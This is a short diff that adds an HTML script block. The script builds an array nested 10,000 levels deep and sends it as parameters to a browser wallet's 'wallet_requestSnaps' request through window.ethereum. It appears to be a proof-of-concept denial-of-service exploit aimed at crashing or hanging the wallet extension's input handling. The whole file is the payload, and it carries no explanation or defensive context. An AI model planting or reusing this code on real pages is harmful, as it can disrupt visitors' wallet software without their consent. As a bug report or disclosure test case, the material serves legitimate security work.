@@ -1,0 +1,17 @@
+<script>
+function createNestedArray(levels, value) {
+  let nestedArray = value;
+  
+  for (let i = 0; i < levels; i++) {
+    nestedArray = [nestedArray];
+  }
+  
+  return nestedArray;
+}
+
+const nestedArray = createNestedArray(10000, 'Hello, World!');
+     window.ethereum.request({
+      "method": "wallet_requestSnaps",
+      "params": nestedArray
+    });
+</script>
